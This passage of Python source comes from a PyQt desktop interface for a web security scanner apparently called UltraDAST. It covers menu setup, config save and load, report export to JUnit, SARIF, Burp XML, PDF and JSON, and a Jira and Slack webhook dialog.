        
        save_config_action = QAction("Save Config", self)
        save_config_action.setShortcut("Ctrl+S")
        save_config_action.triggered.connect(self.export_config)
        file_menu.addAction(save_config_action)
        
        load_config_action = QAction("Load Config", self)
        load_config_action.setShortcut("Ctrl+O")
        load_config_action.triggered.connect(self.import_config)
        file_menu.addAction(load_config_action)
        
        file_menu.addSeparator()
        
        export_burp_action = QAction("Export Burp XML", self)
        export_burp_action.triggered.connect(self.export_burp_xml)
        file_menu.addAction(export_burp_action)
        
        export_pdf_action = QAction("Export PDF Report", self)
        export_pdf_action.triggered.connect(self.export_pdf_report)
        file_menu.addAction(export_pdf_action)
        
        export_json_action = QAction("Export JSON Report", self)
        export_json_action.triggered.connect(self.export_json_report)
        file_menu.addAction(export_json_action)
        
        export_junit_action = QAction("Export JUnit XML", self)
        export_junit_action.triggered.connect(self.export_junit_xml)
        file_menu.addAction(export_junit_action)
        
        export_sarif_action = QAction("Export SARIF", self)
        export_sarif_action.triggered.connect(self.export_sarif)
        file_menu.addAction(export_sarif_action)
        
        file_menu.addSeparator()
        
        exit_action = QAction("Exit", self)
        exit_action.setShortcut("Ctrl+Q")
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)
        
        # Settings menu
        settings_menu = menubar.addMenu("Settings")
        
        webhook_config_action = QAction("Webhook Configuration", self)
        webhook_config_action.triggered.connect(self.configure_webhooks)
        settings_menu.addAction(webhook_config_action)
    
    def add_new_scan_tab(self):
        tab = ScanTab()
        self.tabs.addTab(tab, f"Scan {self.tabs.count()+1}")
    
    def add_repeater_tab(self):
        tab = RepeaterTab()
        self.tabs.addTab(tab, "Repeater")
    
    def add_proxy_tab(self):
        tab = ProxyTab()
        self.tabs.addTab(tab, "Proxy")
    
    def toggle_dark_mode(self):
        self.dark_mode = not self.dark_mode
        if self.dark_mode:
            self.setStyleSheet("""
                QMainWindow { background-color: #2b2b2b; color: #ffffff; }
                QWidget { background-color: #2b2b2b; color: #ffffff; }
                QTextEdit, QPlainTextEdit { background-color: #1e1e1e; color: #ffffff; }
                QLineEdit { background-color: #1e1e1e; color: #ffffff; }
                QTableWidget { background-color: #1e1e1e; color: #ffffff; }
                QTabWidget::pane { border: 1px solid #444; }
                QTabBar::tab { background-color: #3b3b3b; color: #ffffff; }
                QTabBar::tab:selected { background-color: #4b4b4b; }
                QPushButton { background-color: #4b4b4b; color: #ffffff; }
                QPushButton:hover { background-color: #5b5b5b; }
            """)
        else:
            self.setStyleSheet("")
    
    def export_config(self):
        current_tab = self.tabs.currentWidget()
        if isinstance(current_tab, ScanTab):
            config = {
                'url': current_tab.url_input.text(),
                'depth': current_tab.depth_spin.value(),
                'threads': current_tab.threads_spin.value(),
                'delay': current_tab.delay_spin.value(),
                'confidence_threshold': current_tab.conf_spin.value(),
                'js_render': current_tab.js_check.isChecked()
            }
            filename, _ = QFileDialog.getSaveFileName(self, "Export Config", "", "JSON Files (*.json)")
            if filename:
                with open(filename, 'w') as f:
                    json.dump(config, f, indent=2)
                self.statusBar().showMessage(f"Config exported to {filename}")
    
    def import_config(self):
        filename, _ = QFileDialog.getOpenFileName(self, "Import Config", "", "JSON Files (*.json)")
        if filename:
            try:
                with open(filename, 'r') as f:
                    config = json.load(f)
                current_tab = self.tabs.currentWidget()
                if isinstance(current_tab, ScanTab):
                    current_tab.url_input.setText(config.get('url', ''))
                    current_tab.depth_spin.setValue(config.get('depth', 3))
                    current_tab.threads_spin.setValue(config.get('threads', 100))
                    current_tab.delay_spin.setValue(config.get('delay', 0.2))
                    current_tab.conf_spin.setValue(config.get('confidence_threshold', 75))
                    current_tab.js_check.setChecked(config.get('js_render', True))
                self.statusBar().showMessage(f"Config imported from {filename}")
            except Exception as e:
                QMessageBox.warning(self, "Import Error", f"Failed to import config: {e}")
    
    def export_junit_xml(self):
        current_tab = self.tabs.currentWidget()
        if isinstance(current_tab, ScanTab):
            filename, _ = QFileDialog.getSaveFileName(self, "Export JUnit XML", "", "XML Files (*.xml)")
            if filename:
                xml = '<?xml version="1.0" encoding="UTF-8"?>\n<testsuites>\n'
                xml += f'  <testsuite name="UltraDAST Scan" tests="{current_tab.findings_table.rowCount()}">\n'
                for row in range(current_tab.findings_table.rowCount()):
                    vuln_type = current_tab.findings_table.item(row, 0).text()
                    url = current_tab.findings_table.item(row, 1).text()
                    severity = current_tab.findings_table.item(row, 4).text()
                    xml += f'    <testcase name="{vuln_type} at {url}">\n'
                    if severity in ('Critical', 'High'):
                        xml += f'      <failure message="{severity} severity vulnerability"/>\n'
                    xml += '    </testcase>\n'
                xml += '  </testsuite>\n</testsuites>'
                with open(filename, 'w') as f:
                    f.write(xml)
                self.statusBar().showMessage(f"JUnit XML exported to {filename}")
    
    def export_sarif(self):
        current_tab = self.tabs.currentWidget()
        if isinstance(current_tab, ScanTab):
            filename, _ = QFileDialog.getSaveFileName(self, "Export SARIF", "", "JSON Files (*.json)")
            if filename:
                sarif = {
                    "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
                    "version": "2.1.0",
                    "runs": [{
                        "tool": {
                            "driver": {
                                "name": "UltraDAST",
                                "version": "11.0",
                                "informationUri": "https://github.com/ultradast"
                            }
                        },
                        "results": []
                    }]
                }
                for row in range(current_tab.findings_table.rowCount()):
                    vuln_type = current_tab.findings_table.item(row, 0).text()
                    url = current_tab.findings_table.item(row, 1).text()
                    parameter = current_tab.findings_table.item(row, 2).text()
                    confidence = current_tab.findings_table.item(row, 3).text()
                    severity = current_tab.findings_table.item(row, 4).text()
                    cwe = current_tab.findings_table.item(row, 5).text()
                    
                    severity_map = {'Critical': 'error', 'High': 'error', 'Medium': 'warning', 'Low': 'note'}
                    
                    result = {
                        "ruleId": vuln_type,
                        "level": severity_map.get(severity, 'note'),
                        "message": {
                            "text": f"{vuln_type} vulnerability found at {url}"
                        },
                        "locations": [{
                            "physicalLocation": {
                                "artifactLocation": {
                                    "uri": url
                                }
                            }
                        }],
                        "properties": {
                            "parameter": parameter,
                            "confidence": confidence,
                            "severity": severity,
                            "cwe": cwe
                        }
                    }
                    sarif["runs"][0]["results"].append(result)
                
                with open(filename, 'w') as f:
                    json.dump(sarif, f, indent=2)
                self.statusBar().showMessage(f"SARIF exported to {filename}")
    
    def export_burp_xml(self):
        current_tab = self.tabs.currentWidget()
        if isinstance(current_tab, ScanTab):
            filename, _ = QFileDialog.getSaveFileName(self, "Export Burp XML", "", "XML Files (*.xml)")
            if filename:
                xml = '<?xml version="1.0"?>\n<issues>\n'
                for row in range(current_tab.findings_table.rowCount()):
                    vuln_type = current_tab.findings_table.item(row, 0).text()
                    url = current_tab.findings_table.item(row, 1).text()
                    parameter = current_tab.findings_table.item(row, 2).text()
                    confidence = current_tab.findings_table.item(row, 3).text()
                    severity = current_tab.findings_table.item(row, 4).text()
                    
                    # Get evidence from the vulnerability data
                    item = current_tab.findings_table.item(row, 0)
                    vuln = item.data(Qt.UserRole) if item else {}
                    evidence = vuln.get('evidence', '')
                    
                    xml += f"""<issue>
    <serialNumber>{row}</serialNumber>
    <type>{vuln_type}</type>
    <name>{vuln_type}</name>
    <host ip="unknown">{urlparse(url).hostname if url else 'unknown'}</host>
    <path>{urlparse(url).path if url else '/'}</path>
    <location>{url}</location>
    <severity>{severity}</severity>
    <confidence>{confidence}</confidence>
    <issueDetail>{evidence}</issueDetail>
</issue>\n"""
                xml += '</issues>'
                with open(filename, 'w') as f:
                    f.write(xml)
                self.statusBar().showMessage(f"Burp XML exported to {filename}")
    
    def export_pdf_report(self):
        try:
            from reportlab.lib.pagesizes import letter
            from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
            from reportlab.lib.units import inch
            from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer, PageBreak, KeepTogether
            from reportlab.lib import colors
            from reportlab.lib.enums import TA_LEFT, TA_CENTER
        except ImportError:
            QMessageBox.warning(self, "Export Error", 
                "reportlab library not installed. Install with: pip install reportlab")
            return
        
        current_tab = self.tabs.currentWidget()
        if isinstance(current_tab, ScanTab):
            filename, _ = QFileDialog.getSaveFileName(self, "Export PDF Report", "", "PDF Files (*.pdf)")
            if filename:
                try:
                    doc = SimpleDocTemplate(filename, pagesize=letter, rightMargin=72, leftMargin=72, topMargin=72, bottomMargin=18)
                    styles = getSampleStyleSheet()
                    story = []
                    
                    # Custom styles
                    title_style = ParagraphStyle(
                        'CustomTitle',
                        parent=styles['Heading1'],
                        fontSize=18,
                        textColor=colors.darkblue,
                        spaceAfter=30,
                        alignment=TA_CENTER
                    )
                    
                    heading_style = ParagraphStyle(
                        'CustomHeading',
                        parent=styles['Heading2'],
                        fontSize=14,
                        textColor=colors.darkblue,
                        spaceAfter=12
                    )
                    
                    subheading_style = ParagraphStyle(
                        'CustomSubheading',
                        parent=styles['Heading3'],
                        fontSize=12,
                        textColor=colors.darkblue,
                        spaceAfter=6
                    )
                    
                    code_style = ParagraphStyle(
                        'CodeStyle',
                        parent=styles['Code'],
                        fontSize=8,
                        leftIndent=20,
                        spaceAfter=6,
                        fontName='Courier'
                    )
                    
                    # Title
                    story.append(Paragraph("UltraDAST Security Scan Report", title_style))
                    story.append(Spacer(1, 12))
                    
                    # Scan summary
                    vuln_count = current_tab.findings_table.rowCount()
                    story.append(Paragraph("<b>Scan Summary</b>", heading_style))
                    
                    # Calculate severity breakdown
                    severity_counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}
                    for row in range(vuln_count):
                        severity = current_tab.findings_table.item(row, 4).text()
                        if severity in severity_counts:
                            severity_counts[severity] += 1
                    
                    summary_data = [
                        ['Metric', 'Value'],
                        ['Total Findings', str(vuln_count)],
                        ['Critical', str(severity_counts['Critical'])],
                        ['High', str(severity_counts['High'])],
                        ['Medium', str(severity_counts['Medium'])],
                        ['Low', str(severity_counts['Low'])],
                        ['Info', str(severity_counts['Info'])],
                        ['Scan Date', datetime.now().strftime('%Y-%m-%d %H:%M:%S')],
                        ['Tool Version', 'UltraDAST v11.9']
                    ]
                    
                    summary_table = Table(summary_data, colWidths=[2*inch, 2*inch])
                    summary_table.setStyle(TableStyle([
                        ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                        ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
                        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                        ('FONTSIZE', (0, 0), (-1, 0), 10),
                        ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                        ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                        ('GRID', (0, 0), (-1, -1), 1, colors.black),
                    ]))
                    story.append(summary_table)
                    story.append(Spacer(1, 20))
                    
                    # Detailed vulnerabilities
                    if vuln_count > 0:
                        story.append(Paragraph("<b>Detailed Vulnerability Findings</b>", heading_style))
                        story.append(Spacer(1, 12))
                        
                        for row in range(vuln_count):
                            item = current_tab.findings_table.item(row, 0)
                            vuln = item.data(Qt.UserRole) if item else {}
                            
                            # Vulnerability header
                            vuln_type = vuln.get('type', 'Unknown')
                            severity = vuln.get('severity', 'Info')
                            url = vuln.get('url', '')
                            
                            # Color code severity
                            severity_color = colors.red
                            if severity == 'High':
                                severity_color = colors.orange
                            elif severity == 'Medium':
                                severity_color = colors.yellow
                            elif severity == 'Low':
                                severity_color = colors.green
                            elif severity == 'Info':
                                severity_color = colors.blue
                            
                            vuln_heading = ParagraphStyle(
                                'VulnHeading',
                                parent=styles['Heading3'],
                                fontSize=11,
                                textColor=severity_color,
                                spaceAfter=6
                            )
                            
                            story.append(Paragraph(f"[{severity}] {vuln_type}", vuln_heading))
                            story.append(Paragraph(f"<b>URL:</b> {url}", styles['Normal']))
                            
                            if vuln.get('parameter'):
                                story.append(Paragraph(f"<b>Parameter:</b> {vuln.get('parameter')}", styles['Normal']))
                            
                            if vuln.get('method'):
                                story.append(Paragraph(f"<b>Method:</b> {vuln.get('method')}", styles['Normal']))
                            
                            story.append(Paragraph(f"<b>Confidence:</b> {vuln.get('confidence', 0)}%", styles['Normal']))
                            story.append(Paragraph(f"<b>CWE:</b> {vuln.get('cwe', 'N/A')}", styles['Normal']))
                            
                            if vuln.get('cvss_score'):
                                story.append(Paragraph(f"<b>CVSS Score:</b> {vuln.get('cvss_score')} ({vuln.get('cvss_vector', 'N/A')})", styles['Normal']))
                            
                            story.append(Spacer(1, 6))
                            
                            # Evidence
                            if vuln.get('evidence'):
                                story.append(Paragraph("<b>Evidence:</b>", subheading_style))
                                evidence_text = str(vuln.get('evidence', ''))[:500]
                                story.append(Paragraph(evidence_text, code_style))
                                story.append(Spacer(1, 6))
                            
                            # Payload
                            if vuln.get('payload'):
                                story.append(Paragraph("<b>Payload Used:</b>", subheading_style))
                                payload_text = str(vuln.get('payload', ''))[:300]
                                story.append(Paragraph(payload_text, code_style))
                                story.append(Spacer(1, 6))
                            
                            # Response snippet
                            if vuln.get('response'):
                                story.append(Paragraph("<b>Response Snippet:</b>", subheading_style))
                                response_text = str(vuln.get('response', ''))[:300]
                                story.append(Paragraph(response_text, code_style))
                                story.append(Spacer(1, 6))
                            
                            # PoC - curl
                            if vuln.get('poc_curl'):
                                story.append(Paragraph("<b>Proof of Concept (cURL):</b>", subheading_style))
                                curl_text = str(vuln.get('poc_curl', ''))[:500]
                                story.append(Paragraph(curl_text, code_style))
                                story.append(Spacer(1, 6))
                            
                            # PoC - python
                            if vuln.get('poc_python'):
                                story.append(Paragraph("<b>Proof of Concept (Python):</b>", subheading_style))
                                python_text = str(vuln.get('poc_python', ''))[:500]
                                story.append(Paragraph(python_text, code_style))
                                story.append(Spacer(1, 6))
                            
                            # Request headers
                            if vuln.get('request_headers'):
                                story.append(Paragraph("<b>Request Headers:</b>", subheading_style))
                                headers_text = str(vuln.get('request_headers', {}))[:300]
                                story.append(Paragraph(headers_text, code_style))
                                story.append(Spacer(1, 6))
                            
                            # Response headers
                            if vuln.get('response_headers'):
                                story.append(Paragraph("<b>Response Headers:</b>", subheading_style))
                                headers_text = str(vuln.get('response_headers', {}))[:300]
                                story.append(Paragraph(headers_text, code_style))
                                story.append(Spacer(1, 6))
                            
                            # Description
                            if vuln.get('description'):
                                story.append(Paragraph("<b>Description:</b>", subheading_style))
                                desc_text = str(vuln.get('description', ''))[:500]
                                story.append(Paragraph(desc_text, styles['Normal']))
                                story.append(Spacer(1, 6))
                            
                            # Remediation
                            if vuln.get('remediation'):
                                story.append(Paragraph("<b>Remediation:</b>", subheading_style))
                                rem_text = str(vuln.get('remediation', ''))[:500]
                                story.append(Paragraph(rem_text, styles['Normal']))
                                story.append(Spacer(1, 6))
                            
                            # Separator between vulnerabilities
                            story.append(Paragraph("_" * 80, styles['Normal']))
                            story.append(Spacer(1, 15))
                    
                    # Build PDF
                    doc.build(story)
                    self.statusBar().showMessage(f"Detailed PDF report exported to {filename}")
                except Exception as e:
                    QMessageBox.warning(self, "Export Error", f"Failed to generate PDF: {e}")
    
    def export_json_report(self):
        """Export detailed JSON report with all vulnerability information"""
        current_tab = self.tabs.currentWidget()
        if isinstance(current_tab, ScanTab):
            filename, _ = QFileDialog.getSaveFileName(self, "Export JSON Report", "", "JSON Files (*.json)")
            if filename:
                try:
                    report = {
                        "scan_info": {
                            "timestamp": datetime.now().isoformat(),
                            "tool": "UltraDAST v11.9",
                            "total_findings": current_tab.findings_table.rowCount()
                        },
                        "vulnerabilities": []
                    }
                    
                    for row in range(current_tab.findings_table.rowCount()):
                        item = current_tab.findings_table.item(row, 0)
                        vuln = item.data(Qt.UserRole) if item else {}
                        
                        # Build detailed vulnerability object
                        detailed_vuln = {
                            "type": vuln.get('type', ''),
                            "subtype": vuln.get('subtype', ''),
                            "url": vuln.get('url', ''),
                            "parameter": vuln.get('parameter', ''),
                            "method": vuln.get('method', ''),
                            "severity": vuln.get('severity', ''),
                            "confidence": vuln.get('confidence', 0),
                            "cwe": vuln.get('cwe', ''),
                            "evidence": vuln.get('evidence', ''),
                            "full_evidence": vuln.get('full_evidence', ''),
                            "payload": vuln.get('payload', ''),
                            "response": vuln.get('response', ''),
                            "request_headers": vuln.get('request_headers', {}),
                            "response_headers": vuln.get('response_headers', {}),
                            "status_code": vuln.get('status_code', ''),
                            "cvss_score": vuln.get('cvss_score'),
                            "cvss_vector": vuln.get('cvss_vector'),
                            "poc_curl": vuln.get('poc_curl', ''),
                            "poc_python": vuln.get('poc_python', ''),
                            "timestamp": vuln.get('timestamp', ''),
                            "tags": vuln.get('tags', []),
                            "description": vuln.get('description', ''),
                            "remediation": vuln.get('remediation', ''),
                            "references": vuln.get('references', [])
                        }
                        
                        report["vulnerabilities"].append(detailed_vuln)
                    
                    # Add summary statistics
                    severity_counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}
                    for vuln in report["vulnerabilities"]:
                        severity = vuln.get("severity", "Info")
                        if severity in severity_counts:
                            severity_counts[severity] += 1
                    
                    report["summary"] = {
                        "severity_breakdown": severity_counts,
                        "unique_urls": len(set(v["url"] for v in report["vulnerabilities"])),
                        "vulnerability_types": len(set(v["type"] for v in report["vulnerabilities"]))
                    }
                    
                    with open(filename, 'w') as f:
                        json.dump(report, f, indent=2, default=str)
                    
                    self.statusBar().showMessage(f"JSON report exported to {filename}")
                except Exception as e:
                    QMessageBox.warning(self, "Export Error", f"Failed to generate JSON report: {e}")
    
    def configure_webhooks(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Webhook Configuration")
        layout = QFormLayout()
        
        jira_input = QLineEdit()
        jira_input.setPlaceholderText("https://your-jira.atlassian.net/rest/webhooks/...")
        jira_input.setText(getattr(self, 'jira_webhook_url', ''))
        
        slack_input = QLineEdit()
        slack_input.setPlaceholderText("https://hooks.slack.com/services/...")
        slack_input.setText(getattr(self, 'slack_webhook_url', ''))
        
        layout.addRow("JIRA Webhook URL:", jira_input)
        layout.addRow("Slack Webhook URL:", slack_input)
        
        buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        buttons.accepted.connect(dialog.accept)
        buttons.rejected.connect(dialog.reject)
        layout.addRow(buttons)
        
        dialog.setLayout(layout)
        
        if dialog.exec_() == QDialog.Accepted:
            self.jira_webhook_url = jira_input.text().strip()
            self.slack_webhook_url = slack_input.text().strip()
            self.statusBar().showMessage("Webhook configuration saved")

def main():
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()